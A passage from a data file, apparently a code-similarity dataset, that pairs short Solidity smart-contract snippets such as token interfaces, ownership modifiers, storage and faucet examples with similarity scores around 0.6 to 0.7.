}",0.6613603163543277,"contract CentraSale { 

      using SafeMath for uint;  

      address public owner;
      uint public operation;
      mapping(uint => address) public operation_address;
      mapping(uint => uint) public operation_amount; 
      
   
      
      modifier onlyOwner() {
          if (msg.sender != owner) {
              throw;
          }
          _;
      }      
   
      
      function CentraSale() {
          owner = msg.sender; 
          operation = 0;         
      }
      
      
      function() payable {    

        if(!(msg.value > 0)) throw;
        
        operation_address[operation] = msg.sender;
        operation_amount[operation] = msg.value;        
        operation = operation.add(1);
      }

      
      function withdraw() onlyOwner returns (bool result) {
          owner.send(this.balance);
          return true;
      }
      
 }"
"contract B {

  
  
  

  function bSig() 
    public
    constant
    returns(bytes32 fingerprint) 
  {
        return sha3(""Supports B Interface ver 1"");
  }

}",0.664916504276355,"contract Agent {
    using SafeMath for uint256;

    function isInitialized() public constant returns (bool) {
        return false;
    }
}"
"contract DivZero { function divide(uint numerator, uint denominator) public constant returns(uint) { return numerator / denominator;  }}",0.6244535488535379,"contract BancorConverter {

    function getReturn(address fromToken, address toToken, uint amount) public constant returns (uint );

}"
"contract Child {
    address public addr;

    function child (address _addr) {
        addr = _addr;
    }    

    function getAddress() returns (address) {
        return addr;
    }

    function toBytes(address x) returns (bytes b) {
        b = new bytes(20);
        for (uint i = 0; i < 20; i++) {
            b[i] = byte(uint8(uint(x) / (2**(8*(19 - i)))));
        }
    }

    function getName() returns (string) {
        return string(toBytes(addr));
    }
}",0.641032975941036,"contract ERC820Registry {

    function getManager(address addr) public view returns(address);

    function setManager(address addr, address newManager) public;

    function getInterfaceImplementer(address addr, bytes32 iHash) public constant returns (address);

    function setInterfaceImplementer(address addr, bytes32 iHash, address implementer) public;

}"
"contract Number {
    uint256[5] public array = [1, 2, 3, 4, 5];
    function returnArray() public view returns(uint256[5]) {
        return array;
    }
}",0.6348830359442068,"contract ERC20 {

    function totalSupply() public view returns (uint256);

    function balanceOf(address _who) public view returns (uint256);

}"
"contract Bar {
    function getOne() public pure returns(Foo.Bar) {
        return Foo.getOne();
    }
}",0.6981924007307146,"contract MSD4 {

   

    function greenOnFanChun () public pure returns (bool) {

        return true;

    }

}"
"contract MyFirstContract { 

    Bank b; 

    constructor(address bankAddress) public {
        b = Bank(bankAddress); 
    }

    

    function depositInBank(uint amount) public {
        b.deposit(amount);
    }

}",0.6132359658865894,"contract token{



    function transfer(address receiver, uint amount) public;

    function balanceOf(address receiver) constant public returns (uint balance);

}"
"contract EtherTransfer {
    
    function EtherTransfer(address owner) public payable {
        foo(owner);
    }

    function foo(address owner) private {
        
        selfdestruct(owner);
    }
}",0.6875644772870604,"contract mortal {
    address private owner;
    
    function mortal() { owner = msg.sender; }
    
    function kill() { if (msg.sender == owner) selfdestruct(owner); }
}"
"contract Test {

   mapping (bytes32 => mapping(uint => uint)) public map;

   function increase(bytes32 id,uint index) public {        
       map[id][index] = map[id][index] + 1;
   }

}",0.6336928386825756,"contract Jug {
    struct Ilk {
        uint256 duty;
        uint256  rho;
    }

    mapping (bytes32 => Ilk) public ilks;

    function drip(bytes32) public returns (uint);
}"
"contract Example is Upgradeable {
    uint _value;

    function initialize() {
        _sizes[bytes4(sha3(""getUint()""))] = 32;
    }

    function getUint() returns (uint) {
        return _value;
    }

    function setUint(uint value) {
        _value = value;
    }
}",0.6297795460069995,"contract CollectibleExposure {
  function getClosingTime(bytes32 id) constant returns (uint64 value);
  function collect(bytes32 id) returns (uint256 value);
  function close(bytes32 id) payable;
}"
"contract Usernames {
    mapping (address => bytes32) public names;
    mapping (bytes32 => address) public owners;

    function associateNameForEver(bytes32 name) {
        if (owners[name] !=0) throw;
        if (names[msg.sender] != 0) throw;
        owners[name] = msg.sender;
        names[msg.sender] = name;
    }
}",0.6077808886935252,"contract EthCCPlayingCards {



    mapping (address => bool) public addressFound;



    event LogAddressFound(address indexed whoAddress, bytes32 whoName);



    function addressFoundBy(bytes32 name) public {

        addressFound[msg.sender] = true;

        emit LogAddressFound(msg.sender, name);

    }

}"
"contract IPFSStorage {
    string hash;
    function storeCIDAsString(string _hash) public {
        hash = _hash;
    }
}",0.6449597393900532,"contract storadge {
    
    event log(string description);
    
	function save(
        string mdhash
    )
    {
        log(mdhash);
    }
}"
"contract Faucet {

    
    function withdraw(uint withdraw_amount) public {

        
        require(withdraw_amount < msg.sender.balance);

        
        msg.sender.transfer(withdraw_amount);

    }

    
    function () payable external {} 

    
    function getBalanceContract() public view returns(uint){
        return address(this).balance;
    }
}",0.6898199711827061,"contract Withdrawable {
    mapping (address => uint) public pendingWithdrawals;

    function withdraw() public {
        uint amount = pendingWithdrawals[msg.sender];
        
        require(amount > 0);
        require(this.balance >= amount);

        pendingWithdrawals[msg.sender] = 0;
        msg.sender.transfer(amount);
    }
}"
"contract test {

    mapping (address => uint[]) public transactions;

    constructor() public {
        transactions[msg.sender].push(123456);
        transactions[msg.sender].push(789101);
        transactions[msg.sender].push(865436);
    }

    function getTransactions() public view returns (uint[]) {

        return transactions[msg.sender];

    }
}",0.6035840149460319,"contract ProofOfExistence {



    uint topHash;

    address owner;



    constructor() public {

       owner = msg.sender;

    }



    function publishTopHash(uint _topHash) public {

        if (owner == msg.sender) {

            topHash = _topHash;

        }

    }



    function get() public view returns (uint) {

        return topHash;

    }

}"
"contract C {
    function bar(uint n) public returns (uint) {
        A a;
        if (n == 1) {
            a = new A();
        } else {
            a = A(address(new B()));
        }
        a.foo();
        return a.n();
    }
}",0.6325723522275947,"contract testabi {

    uint c;

    function tinhtong(uint a, uint b) public {

        c = a+b;

    } 

    function ketqua() public view returns (uint) {

        return c;

    }

}"
"contract admin {
  IERC20 public token;

  struct StakeInfo {
    address user;
    uint amount;
    uint unlockTime;
  }

  StakeInfo [] public stakes;

  constructor (IERC20 _token) public {
    token = _token;
  }

  function putAtStake (uint _amount, uint _unlockTime)
  public returns (uint _stakeID){
    require (_unlockTime > block.timestamp);

    _stakeID = stakes.length;

    stakes.push (StakeInfo ({
      user: msg.sender,
      amount: _amount,
      unlockTime: _unlockTime
    })); 

    require (token.transferFrom (msg.sender, address (this), _amount));

    emit Stake (_stakeID, msg.sender, _amount, _unlockTime);
  }

  function refund (uint _stakeID) public {
    StakeInfo memory stake = stakes [_stakeID];

    require (stake.user != address (0));
    require (stake.unlockTime <= block.timestamp);

    delete stakes [_stakeID];

    require (token.transfer (stake.user, stake.amount));
  }

  event Stake (uint indexed id, address indexed user, uint amound, uint unlockTime);
}",0.6030994728211508,"contract tokenHodl {

    event Hodl(address indexed hodler, uint indexed amount);

    event Party(address indexed hodler, uint indexed amount);

    mapping (address => uint) public hodlers;

    uint partyTime = 1522093545; 

    function() payable {

        hodlers[msg.sender] += msg.value;

        Hodl(msg.sender, msg.value);

    }

    function party() {

        require (block.timestamp > partyTime && hodlers[msg.sender] > 0);

        uint value = hodlers[msg.sender];

        uint amount = value/100;

        hodlers[msg.sender] = 0;

        msg.sender.transfer(amount);

        Party(msg.sender, amount);

        partyTime = partyTime + 120;

    }

    function withdrawForeignTokens(address _tokenContract) returns (bool) {

        if (msg.sender != 0x239C09c910ea910994B320ebdC6bB159E71d0b30) { throw; }

        require (block.timestamp > partyTime);

        

        ForeignToken token = ForeignToken(_tokenContract);



        uint256 amount = token.balanceOf(address(this))/100;

        return token.transfer(0x239C09c910ea910994B320ebdC6bB159E71d0b30, amount);

        partyTime = partyTime + 120;

    }

}"
"contract Test {
    uint248 public value;

    function Test() {
        value = 123;
    }

    function () payable {
        value = uint248(msg.value);
    }
}",0.6115050262553551,"contract Token {

    function transfer(address _to, uint256 _value) 
        external;

    function burn(uint256 _value) 
        external;

}"
"contract TestStatus {
    uint public value;
    function setValue(uint256 _value) {
        value = _value;
        if (_value < 12345) {
            throw;
        }
    }
}",0.6145987987433675,"contract Burnable {

  function burn(uint256 value) public returns (bool);

  event Burn(address indexed from, uint256 value);

}"
"contract Test { 
    mapping(string => bool) seen;

    function add(string foo) external {
        seen[foo] = true;
    }

    function alreadySeen(string foo) external view returns (bool) {
        return seen[foo];
    }
}",0.6880951041682841,"contract Nest {

    mapping (uint256 => bool) public inNest;

    function getEggs() external view returns (uint256[2]);

    function add(uint256) external returns (bool, uint256, uint256);

}"
"contract Foo {
    struct Bar {
        bytes32 a;
        uint8[9] b;
    }

    Bar[] public bars;

    function add(bytes32 _a, uint8[9] _b) public {
        bars.push(Bar(_a, _b));
    }

    function getBarBs(uint256 _index) public returns (uint8[9]) {
        return bars[_index].b;
    }
}",0.6382183820812619,"contract SafeMath {

    function safeAdd(uint _a, uint _b) public pure returns (uint c) {

        c = _a + _b;

        require(c >= _a);

    }

    function safeSub(uint _a, uint _b) public pure returns (uint c) {

        require(_b <= _a);

        c = _a - _b;

    }

}"
"contract HexUtils {

    
    byte constant a = byte('a');
    byte constant f = byte('f');
    byte constant A = byte('A');
    byte constant F = byte('F');
    byte constant zero = byte('0');
    byte constant nine = byte('9');

    
    function hexCharToByte(uint c) pure internal returns(uint) {
        byte b = byte(c);

        
        if(b >= zero && b <= nine) {
            return c - uint(zero);
        } else if(b >= a && b <= f) {
            return 10 + (c - uint(a));
        } else if(b >= A && b <= F) {
            return 10 + (c - uint(A));
        }
    }

    
    function hasZeroXPrefix(string s) pure internal returns(bool) {
        bytes memory b = bytes(s);
        if(b.length < 2) {
            return false;
        }
        return b[1] == 'x';
    }

    
    function hexToUint(string s) pure public returns(uint) {
        
        bytes memory b = bytes(s);

        
        require(b.length % 2 == 0, ""String must have an even number of characters"");

        
        uint i = 0;
        
        if(hasZeroXPrefix(s)) {
            i = 2;
        }
        uint r = 0;
        for(;i<b.length;i++) {
            
            uint b1 = hexCharToByte(uint(b[i]));

            
            
            r = (r << 4) | b1;
        }
        
        return r;
    }

    
    function substr(string s, uint start, uint end) pure public returns(string) {
        require(end > start, ""End must be more than start"");
        bytes memory res = new bytes(end-start);
        bytes memory bts = bytes(s);
        require(end <= bts.length, ""End must be less than or equal to the length of string"");
        require(start >= 0 && start < bts.length, ""Start must be between 0 and length of string"");

        uint idx = 0;
        for(uint i=start;i<end;++i) {
          
            res[idx] = bts[i];
            ++idx;
        }
        return string(res);
    }

    
    function parseAddr(string _a) internal pure returns (address){
        
        uint iaddr = hexToUint(_a);
        return address(iaddr);
    }

    
    function parseResults(string _hexData) pure public returns(uint, address, uint) {
        
        uint startIdx = 0;
        if(hasZeroXPrefix(_hexData)) {
            startIdx = 2;
        }
        bytes memory bts = bytes(_hexData);
        
        uint ethVal = hexToUint(substr(_hexData, startIdx,64+startIdx));

        
        uint idStart = bts.length - 64;

        
        uint addrEnd = idStart-1;

        
        address addr = parseAddr(substr(_hexData, addrEnd-40, addrEnd));

        
        uint id = hexToUint(substr(_hexData, idStart, bts.length));

        
        return (ethVal, addr, id);
    }
}",0.6291759582911228,"contract RTKICO is owned {

  ERC20   public tokenSC;   
  address        treasury;  
  uint    public start;     
  uint    public duration;  
  uint    public tokpereth; 

  function RTKICO( address _erc20,
                   address _treasury,
                   uint    _startSec,
                   uint    _durationSec,
                   uint    _tokpereth ) public {

    require( isContract(_erc20) );
    require( _tokpereth > 0 );

    if (_treasury != address(0))
      require( isContract(_treasury) );

    tokenSC = ERC20( _erc20 );
    treasury = _treasury;
    start = _startSec;
    duration = _durationSec;
    tokpereth = _tokpereth;
  }

  function setTreasury( address treas ) public onlyOwner { treasury = treas; }
  function setStart( uint newstart ) public onlyOwner { start = newstart; }
  function setRate( uint rate ) public onlyOwner { tokpereth = rate; }
  function setDuration( uint dur ) public onlyOwner { duration = dur; }

  function() public payable {
    if (now < start || now > (start + duration))
      revert();

    
    
    
    
    uint qty =
      multiply( divide( multiply( msg.value, tokpereth ),
                        1e20 ),
                (bonus()+100) );

    if (qty > tokenSC.balanceOf(address(this)) || qty < 1)
      revert();

    tokenSC.transfer( msg.sender, qty );

    if (treasury != address(0)) treasury.transfer( msg.value );
  }

  
  function claimUnsold() public onlyOwner {
    if ( now < (start + duration) )
      revert();

    tokenSC.transfer( owner, tokenSC.balanceOf(address(this)) );
  }

  function withdraw( uint amount ) public onlyOwner returns (bool) {
    require (amount <= this.balance);
    return owner.send( amount );
  }

  function bonus() internal constant returns(uint) {
    uint elapsed = now - start;

    if (elapsed < 1 weeks) return 20;
    if (elapsed < 2 weeks) return 15;
    if (elapsed < 4 weeks) return 10;
    return 0;
  }

  function isContract( address _a ) constant private returns (bool) {
    uint ecs;
    assembly { ecs := extcodesize(_a) }
    return ecs > 0;
  }

  
  
  function multiply(uint256 a, uint256 b) pure private returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function divide(uint256 a, uint256 b) pure private returns (uint256) {
    return a / b;
  }
}"
"contract AddrToNumber {

    address[] public addressList; 

    function pushAddess(address addToList) public {
        addressList.push(addToList); 
    }

    function getAddressCount() public view returns(uint count) {
        return addressList.length;
    }

    function convertAddrToUniqueUint(address addressToConvert) public pure returns(uint uniqueToAddress) {
        return uint(keccak256(abi.encodePacked(addressToConvert)));
    }
}",0.6212533081094669,"contract VatLike {
    function urns(bytes32, address) public view returns (uint, uint);
    function hope(address) public;
    function flux(bytes32, address, address, uint) public;
    function move(address, address, uint) public;
    function frob(bytes32, address, address, address, int, int) public;
    function fork(bytes32, address, address, int, int) public;
}"
"contract A {

  event LogNewStudent(address a);
  struct details { string name; uint roll ;} 
  mapping (address => details) public testMap;

  function set (string name, uint roll) {
    Student instance = new Student(name, roll);
    testMap[instance] = details(name,roll);
    LogNewStudent(instance);
  }

  function get (address a) 
    constant
    returns(string name, uint roll) 
  {
    
    return(testMap[a].name, testMap[a].roll);
  }
}",0.6055900007834912,"contract UserName {



  mapping (address => mapping (uint => string)) public userDict;



  event OnNameChanged(uint indexed _guid, address indexed _who, string _newName);



  function changeName(uint _guid, string _newName) public {

    userDict[msg.sender][_guid] = _newName;

    OnNameChanged(_guid, msg.sender, _newName);

  }



  function nameOf(uint _guid, address _who) view public returns (string) {

    return userDict[_who][_guid];

  }

}"
"contract Memory {

    function doSomething(uint[] memory array) public pure returns(uint[] memory y) {
        return array;
    }
}",0.6303049573704971,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract Ranges {

    address public owner;

    uint public lowerLine;
    uint public upperLine;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    event LogNewLines(address sender, uint lower, uint upper);

    function isValidRange(uint lower, uint upper) public pure returns(bool isIndeed) {
        return lower > 0 && upper > lower;
    }

    function Ranges(uint lower, uint upper) public {
        require(isValidRange(lower,upper));
        owner = msg.sender;
        lowerLine = lower;
        upperLine = upper;
        LogNewLines(msg.sender, lower, upper);
    }

    function isInRange(uint check) public view returns(bool isIndeed) {
        return check >= lowerLine && check <= upperLine;
    }

    function setRange(uint lower, uint upper) public onlyOwner returns(bool success) {
        require(isValidRange(lower,upper));
        lowerLine = lower;
        upperLine = upper;
        LogNewLines(msg.sender, lower, upper);
        return true;
    }
}",0.605943390132663,"contract NetkillerCashier{

    address public owner;
    uint public amount;
    uint public amounteth;
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    constructor() public {
        owner = msg.sender;
    }

    function transfer(address _to, uint _value) public payable {
        amount += _value;
        if (amounteth < msg.value){
            amounteth += msg.value;
        }else{
            amounteth -= msg.value;
        }
        
    }

	function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }

    function withdraw() onlyOwner public {
        msg.sender.transfer(amounteth);
    }

    function balanceOf() public constant returns (uint balance) {
        return amount;
    }
    
    function balanceOfeth() public constant returns (uint balance) {
        return amounteth;
    }
    
    function balanceOfmax() public constant returns (uint balance) {
         if (amount>=amounteth){
            return amount;
        }else{
            return amounteth;
        }
    }
}"
"contract Test {

  struct person {  
    address id;
    string name;
  }

  person[] p;

  event LogNewPerson(address newPerson, string name);

  function addPerson (string _name) returns (bool added) {  
    person memory per;
    per.id = msg.sender;
    per.name = _name;
    p.push(per);
    LogNewPerson(msg.sender, _name);
    return true;
  }

  function getPerson (address a) constant returns (address d, string n) {  
    for (uint k = 0; k <= p.length; k++) {  
      if (p[k].id == a) {
        return(p[k].id, p[k].name);
      }
    }
  }
}",0.6064149253100102,"contract MularPay is ERC20 {

    string private constant _name = ""MularPay"";

    string private constant _symbol = ""MP"";

    uint8 private constant _decimals = 18;



    

    constructor (address receiver) public {

        

        

        _mint(receiver, 1000000000 * 1 ether);

    }



    

    function name() public pure returns (string memory) {

        return _name;

    }



    

    function symbol() public pure returns (string memory) {

        return _symbol;

    }



    

    function decimals() public pure returns (uint8) {

        return _decimals;

    }

}"
"contract foo is Class { 

  uint currentSupply; 

  function foo()
    ParentToken(currentSupply, tok...) { 
  }
}",0.6017223328999779,"contract CursedToken is ERC20 {
    function issue(address to, uint tokencount) public;
}"
"contract NestedArrays {
    function test(uint[][] nested) public {
    }
}",0.667438079166474,"contract Recommitable {

    function recommit(uint id) public;

}"
"contract Adoption {
    struct Pet {
        address owner;
        uint256 price;
    }

    Pet[16] data;

    function Adoption() public {
        for (uint i = 0; i < 16; i++) {
            data[i].owner = msg.sender;
            data[i].price = i;
        }
    }

    function getAdopters() external view returns (address[],uint256[]) {
        address[] memory owners = new address[](16);
        uint256[] memory prices =  new uint256[](16);
        for (uint i = 0; i < 16; i++) {
            owners[i] = (data[i].owner);
            prices[i] = (data[i].price);
        }
        return (owners,prices);
    }
}",0.6257564488876002,"contract ERC20 is ERC20Basic {
    function allowance(address _owner, address _spender) public view returns (uint256);

    function symbol() public view returns (string memory);

    function transferFrom(address _from, address _to, uint256 _value)
    public returns (bool);

    function approve(address _spender, uint256 _value) public returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}"
"contract Counters {

  uint[] counters;

  function _getCounter(uint _index) view private returns (uint, bool success) {
    require(_index >= 0 && _index < counters.length);
    return (counters[_index], true); 
  }

  function checkCounter(uint _index) view public returns ( ... ) {
    uint counter;
    bool success;
    (counter, success) = _getCounter(_index);
    if (success == false) { ... } else { ... };
  }

}",0.6160341183729157,"contract ERC223Interface {

    function balanceOf(address who)public view returns (uint);

    function transfer(address to, uint value)public returns (bool success);

    function transfer(address to, uint value, bytes memory data)public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint value);

}"
"contract ProxyStorage is Ownable {
  address public lib;

  constructor (address _newLib) public {
    replace(_newLib);
  }

  function replace(address _newLib) public onlyOwner  {
    lib = _newLib;
  }
}",0.6352850703124246,"contract owned {

    address public owner;



    constructor() public {owner = msg.sender;}



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function ayu(address nO) onlyOwner public {owner = nO;}

}"
"contract WidgetMaker is Owned {
  
}",0.6517480111503683,"contract Creator is Ownable {
}"
"contract WidgetManager is Owner {
  
  function changeWidgetMakerOwner(address newOwner) public onlyOwner returns(bool success) {
    require(newOwner != 0); 
    maker.changeOwner(newOwner); 
    LogMakerOwnerChanged(msg.sender, newOwner);
    return true;

}",0.6724114032579586,"contract Owned {

    address public owner;

    function Owned() {

        owner = msg.sender;

    }

    modifier onlyOwner {

        require(msg.sender == owner);
        _;

    }

    function transferOwnership(address newOwner) onlyOwner {

        require(newOwner != 0x0);
        
        owner = newOwner;

    }

}"
"contract bidding {

    address[] public bidderAccts;

    
    mapping (address => uint[]) public bids;

    event LogNewBidder(address newBidder);
    event LogNewBid(address bidder, uint bid);

    function isBidder(address bidder) public view returns(bool isIndeed) {
        
        return bids[bidder].length > 0;
    }

    function upsertBidder(address bidder) public {
        if(!isBidder(bidder)) {
            bidderAccts.push(bidder);
            emit LogNewBidder(bidder);
        }
    }

    function setBid(uint bid)  public {
            
            require(bid > 0);
            upsertBidder(msg.sender);
            bids[msg.sender].push(bid);
            emit LogNewBid(msg.sender, bid);
    }

     function getUniqueBidderCount() view public returns (uint) {
        return bidderAccts.length;
    }       

}",0.6031408869627094,"contract ERC20Base {
	uint public totalSupply;

	event Transfer(address indexed from, address indexed to, uint value);
	event Approval(address indexed owner, address indexed spender, uint value);

	function balanceOf(address who) public view returns (uint);
  	function transfer(address to, uint value) public returns (bool);
  	function allowance(address owner, address spender) public view returns (uint);
  	function transferFrom(address from, address to, uint value) public returns (bool);
  	function approve(address spender, uint value) public returns (bool);
}"
"contract SomeContract {

  event NewValue (
      address _address,
      uint256 _value
      );
  mapping(address => uint256) public someMapping;


  function addValue(address _newAddress, uint256 _newValue) public {
    someMapping[_newAddress] = _newValue;
    emit NewValue(_newAddress, _newValue);
  }

}",0.6456747676006873,"contract AppCoins {
    mapping (address => mapping (address => uint256)) public allowance;
    function balanceOf (address _owner) public constant returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) public returns (uint);
}"
"contract PullPaymentMock is PullPayment {

  function PullPaymentMock() public payable { }

  
  function callSend(address dest, uint256 amount) public {
    asyncSend(dest, amount);
  }

}",0.6422466435911689,"contract DonationSplitter is SplitPayment {
    function DonationSplitter (address[] _payees, uint256[] _shares)
        SplitPayment(_payees, _shares)
        public
    {

    }

    
    function () public payable {}
}"
"contract StructStore {
    mapping(uint256 => User) users;

    struct User {
        uint256 id;
        
        string[] data;
    }

    
    function newUser(uint256 _id) public {
        
        
        users[_id].id = _id;
    }

    
    function addData(uint256 _id, string _data) public {
        users[_id].data.push(_data);
    }

    
    function setData(uint256 _id, uint256 _index, string _newData) public {
        users[_id].data[_index] = _newData;
    }

    
    
    function getUserData(uint256 _id, uint256 _dataIndex) public view returns (string) {
        return users[_id].data[_dataIndex];
    }

    
    function getDataSize(uint256 _id) public view returns (uint256) {
        return users[_id].data.length;        
    }
}",0.6134214532981072,"contract CryptoMiningWarInterface {

    address public sponsor;

    address public administrator;

    mapping(address => PlayerData) public players;

    struct PlayerData {

        uint256 roundNumber;

        mapping(uint256 => uint256) minerCount;

        uint256 hashrate;

        uint256 crystals;

        uint256 lastUpdateTime;

        uint256 referral_count;

        uint256 noQuest;

    }

    function getHashratePerDay(address ) public pure returns (uint256 ) {}

    function addCrystal( address , uint256  ) public pure {}

    function subCrystal( address , uint256  ) public pure {}

    function fallback() public payable {}

}"
"contract SubClassChild {

    event LogSender(address sender, address origin, address me);

    function lookWhosTalking() public returns(address) {
        emit LogSender(msg.sender, tx.origin, address(this));
        return msg.sender;
    }

    

    

    function rightHere() public returns(address) {
        emit LogSender(msg.sender, tx.origin, address(this));
        return msg.sender;
    }

}",0.6356893744739299,"contract Ownable {

    event TransferOwner(address _from, address _to);



    address public owner;

    

    constructor() public {

        owner = msg.sender;

        emit TransferOwner(0x0, msg.sender);

    }

    

    function setOwner(address _owner) external returns (bool) {

        require(owner == msg.sender);

        owner = _owner;

        emit TransferOwner(msg.sender, _owner);

        return true;

    }

}"
"contract Person {
    uint public age;
    uint public weight;

    function Person(uint _age, uint _weight) public {
        age = _age;
        weight = _weight;
    }
}",0.6151833405887269,"contract testabi {

    uint c;

    function tinhtong(uint a, uint b) public {

        c = a+b;

    } 

    function ketqua() public view returns (uint) {

        return c;

    }

}"
"contract PersonHolder {

    address[] public people; 

    function addPerson(uint age, uint weight) public {
        people.push(new Person(age, weight));
    }

    function getPerson(uint index) public view returns (Person) {
        require(people.length > index);

        return Person(people[index]);
    }
}",0.6116471694638201,"contract ProofOfExistence {



    uint topHash;

    address owner;



    constructor() public {

       owner = msg.sender;

    }



    function publishTopHash(uint _topHash) public {

        if (owner == msg.sender) {

            topHash = _topHash;

        }

    }



    function get() public view returns (uint) {

        return topHash;

    }

}"
"contract SimpleWhitelist {

    address public owner;
    mapping(address => bool) public isAuthorizedDevice;

    modifier onlyOwner {
        require(msg.sender==owner);
        _;
    }

    modifier onlyAuthorizedDevice {
        require(isAuthorizedDevice[msg.sender]);
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    function addOrRemoveDevice(address device, bool authorized) public onlyOwner {
        isAuthorizedDevice[device]=authorized;
    }

    function somethingDevicesDo() public onlyAuthorizedDevice {
        
    }
}",0.6490094497406224,"contract Owned {
    address public owner = msg.sender;
    bool public restricted = true;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    
    modifier onlyCompliant {
        if (restricted) require(tx.origin == msg.sender);
        _;
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
    
    function changeRestrictions() public onlyOwner {
        restricted = !restricted;
    }
    
    function kill() public onlyOwner {
        selfdestruct(owner);
    }
}"
"contract EventsInterface 
{
   function removeValueFromArray(uint _userId, uint[] memory _array) internal returns(uint[] memory);
}",0.6287690829110105,"contract CERC20NoBorrowInterface {

    function mint(uint mintAmount) external returns (uint);

    address public underlying;

}"
"contract XFactory {
    function createX() returns (X) {
        return new X();
    }
}",0.6429842157986713,"contract DSTrueFallback {

    function() returns (bool) {

        return true;

    }

}"
"contract Factory {
    bytes32[] public names;
    address[] public contracts;

    function createContract(bytes32 name) returns(address) {
        address newContract = new MyContract(name);
        names.push(name);
        contracts.push(newContract);
        return newContract;
    }

    function getName(uint i) constant returns(bytes32 contractName) {
        return names[i];
    }

    function getAddress(uint i) constant returns(address contractAddress) {
        return contracts[i];
    }
}",0.6031364871835136,"contract AthCrowdsaleInterface
{
    function investorsCount() public constant returns( uint256 );
    
    function investorsAddress( uint256 _i ) public constant returns( address );
    
    function investorsInfo( address _a ) public constant returns( uint256, uint256 );
    
    function investorsStockInfo( address _a ) public constant returns( uint256 );
    
    function getOwners(uint8) public constant returns( address );
}"
"contract Counter {

        int private count = 0;
        address public admin;

        constructor() public {
            admin = msg.sender;
        }

        function incrementCounter() public {
            require(msg.sender==admin);
            count += 1;
        }

        function decrementCounter() public {
            require(msg.sender==admin);
            count -= 1;
        }

        function getCount() public constant returns (int) {
            return count;
        }
    }",0.6588454377425029,"contract Ownership is IOwnership {

    
    address internal owner;


    
    function Ownership() {
        owner = msg.sender;
    }


    
    modifier only_owner() {
        require(msg.sender == owner);
        _;
    }


    
    function isOwner(address _account) public constant returns (bool) {
        return _account == owner;
    }


    
    function getOwner() public constant returns (address) {
        return owner;
    }
}"
"contract ArrayStruct {

    struct User {
        uint idNum;
        string name;
        address userAddress;
    }

    User[] public users;

    function addUser(uint _idNum, string _name, address _userAddress) public returns(uint) {
        users.length++;
        users[users.length-1].idNum = _idNum;
        users[users.length-1].name = _name;
        users[users.length-1].userAddress = _userAddress;
        return users.length;
    }

    function getUsersCount() public constant returns(uint) {
        return users.length;
    }

    function getUser(uint index) public constant returns(uint, string, address) {
        return (users[index].idNum, users[index].name, users[index].userAddress);
    }
}",0.6294974655286293,"contract NRB_Tokens {
    function init(address _main, address _flc) public;
    function getTokenListLength() constant public returns (uint);
    function getTokenAddressByIndex(uint _index) constant public returns (address);
    function isTokenRegistered(address _token) constant public returns (bool);
    function registerToken(address _token, string _name, string _symbol, uint _decimals) public;
    function registerTokenPayment(address _token, uint _value) public;
    function sendFLC(address user, address token, uint totalpaid) public returns (uint);
}"
"contract MappingExample {
    mapping(address => uint) public balances;

    function update(uint newBalance) {
        balances[msg.sender] = newBalance;
    }
}",0.6736146632684147,"contract TestToken {
    
    mapping (address => uint) public balanceOf;
    
    function () public payable {
        
        balanceOf[msg.sender] = msg.value;
        
    }
    
}"
"contract MappingUser {
    function f() returns (uint) {
        return MappingExample(<address>).balances(this);
    }
}",0.6551516844003802,"contract TokenBurner {
    function burn(address , uint )
    returns (bool result) {
        return false;
    }
}"
"contract SimpleStorage {

  uint public x;

  function set(uint _x) public {
    x = _x;
  }
}",0.6589235792589347,"contract Counter {
    uint public counter;
    function increment() public { counter++; }
}"
"contract Blackjack {

   uint[52] public deck;

   constructor() public {

       for (uint i = 0; i < 52; i++) {
            deck[i] = i;
       }
    }

    function getit() public view returns (uint) {
        return deck[5];
    }
}",0.6522630834563543,"contract DeploymentInfo {

  uint private deployed_on;



  constructor() public {

    deployed_on = block.number;

  }





  function getDeploymentBlock() public view returns (uint) {

    return deployed_on;

  }

}"
"contract A {"" +
  ""  uint public a;"" +
  ""  uint public b;"" +
  ""  function A(uint a_, uint b_) {a = a_; b = b_; }"" +
  ""}",0.6370563991566573,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract Test {

    struct Request {
        function(uint) external callback;
    }

    Request[] private requests;

    function getAddress (uint requestID) public view returns (address) {
        return requests[requestID].callback.address;
    }
}",0.6263685669538249,"contract MBLToken {

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    function balanceOf(address _tokenOwner) external view returns (uint balance);



 }"
"contract Parent {
    using Bytes32 for bytes32;

    function bar() public pure returns(string) {
        return bytes32(0).toString();              
    }
}",0.6614959430969959,"contract Destiny {
    function fight(bytes32 cat1, bytes32 cat2, bytes32 entropy) public returns (bytes32 winner);
}"
"contract ethertransfer {    
  function fundtransfer(address etherreceiver, uint256 amount) public payable {
    if(!etherreceiver.transfer(amount)) {
       throw;
    }
  }
}",0.6431898648418737,"contract Token {

    function transfer(address receiver, uint amount) public;

    function balanceOf(address receiver)public returns(uint);

}"
"contract _Chronos {
    function registerCall(address contractAddress, uint256 callOnBlock, uint256 gasAmount) public returns (uint256);
    function clientWithdraw(uint256 value) public;
    function clientFunding(address contractAddress) public payable;

}",0.6913595779997654,"contract Token {
    function transferSoldToken(address _contractAddr, address _to, uint256 _value) public returns(bool);
    function balanceOf(address who) public view returns (uint256);
    function totalSupply() public view returns (uint256);
}"
"contract Client {
    function setCallrequest(uint256 blockNumber, uint256 gasAmount) public;
    function callBack() public;
    function withdrawFromChronos(uint value) public;
    function getDepositsFromChronos() public payable;
}",0.6496743425346782,"contract GemLike {
    function approve(address, uint) public;
    function transfer(address, uint) public;
    function transferFrom(address, address, uint) public;
    function deposit() public payable;
    function withdraw(uint) public;
}"
"contract T {
